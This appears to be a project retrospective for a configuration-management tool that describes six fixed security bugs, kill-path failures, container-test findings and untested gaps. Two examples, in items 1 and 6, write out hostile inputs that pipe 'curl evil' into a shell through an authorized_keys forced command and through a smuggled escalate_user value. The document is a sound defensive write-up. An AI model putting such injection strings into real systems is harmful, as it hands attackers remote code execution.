## Security bugs found and fixed

Six, none found by a test suite. Five were found by review, one by reading
every public item for the documentation pass.

1. **`github::UserKeys` installed a forced command.** A `.keys` response
   carrying an `authorized_keys` options field was passed through verbatim, so
   `command="curl evil|sh",no-pty ssh-ed25519 …` from anything that is not
   github.com unaltered became a line in a user's `authorized_keys` while the
   run reported a clean `changed`. This one **reached main** and was fixed
   half an hour later in #17. It is also the only branch that merged without
   the protocol's review pass; the pass is what found it.
2. **`archive::Extracted` sized a buffer from the tar header's own `size`.**
   An archive claiming 2^62 bytes aborts the process on allocation failure,
   killing the run rather than being refused. Reachable through `apply`, which
   re-reads the file, not through `check`.
3. **`chmod` ran before `chown`**, and `chown(2)` clears setuid and setgid on
   non-directories, so extracting a setuid binary with an owner silently
   produced a plain mode and reported success. The same ordering was in the
   shared `file::apply_attrs` that every merged file op uses.
4. **The escalation helper printed the bytes of a refused write** in its
   refusal message, including a `ctx.local_secret` payload, defeating the
   point of the redacted `Secret` type.
5. **`shell::Command`'s hand-written `Debug` redacted piped stdin and then
   printed environment values in full.** Its own test used a database password
   as the example.
6. **The escalation prefix reached a shell unquoted**, with `escalate_user`
   unvalidated from the inventory, so an inventory carrying
   `escalate_user="x; curl evil|sh"` executed that on cancel.

## The kill path, three times wrong

M5's cancel could not kill what it claimed to kill, in three independent ways,
each reporting success while the playbook binary kept running on the target:

- the binary's path was recovered by filtering wrapper words out of the
  argument list, and landed on `-u` behind a non-root `escalate_user`;
- the `/proc/<pid>/exe` precision guard needs ptrace access the login user
  does not have for an escalated run's processes, so it rejected every
  candidate;
- the process search matched the shell running the search, which killed itself
  partway through the loop.

All three hid behind the same thing: sshd tears down the session when the
orchestrator exits, so the processes died anyway and the bug looked like
correct behaviour. Separating them needed the scripts run against a live
root-owned binary with the session left alone.

## What the container tests earned

They cost real time to build and run, and they caught two things no `Fake`
test could:

- `group::Present` followed by `user::Present` with one name fails on every
  real image, because `useradd` and BusyBox `adduser` each try to create a
  private group of that name. Every fake test passed, because a fake returns
  the exit status a test hands it.
- The setuid ordering bug above, re-verified by restoring the bug and watching
  two container tests fail.

They also surfaced a flake in the harness itself, where `offline` was treated
as terminal although `systemctl is-system-running` answers `offline` whenever
it cannot reach the manager, including a container's first moments.

## Deferred and unverified

A green suite is not a verified one. These are the gaps:

- **The `sudo -S` password path and `doas`.** Both hosts have passwordless
  sudo and neither has `doas`. Argv shapes and the probe rule are unit-tested;
  the live path is not.
- **TLS inside a container.** The harness cannot hand `http::Download` a CA
  certificate, so its container leg is plain HTTP. Real TLS is covered by
  `#[ignore]`d tests that fetch github.com, run by hand on both architectures.
- **The ARM VM** was unreachable for the first hour, so M1's ARM leg is
  deferred (`logs/M1-arm.txt`). M3, M5 and the TLS swap all ran there once it
  returned. `http::Download` and `archive::Extracted` never have.
- **`mc`'s changed path** in M3's done-when block: it was already installed on
  both hosts and the protocol allows sudo only to install it, not remove it,
  so those legs read `ok`. Escalation is verified by `user=root` in the facts
  line; apt's changed-then-ok path is covered by container tests.
- **Large payloads.** `http::Download` and `archive::Extracted` buffer in
  memory by design and were not tested above a few megabytes.
- **`shell::Command` stdin over SSH.** The fix is in the local backend and no
  container test reaches the remote transport.
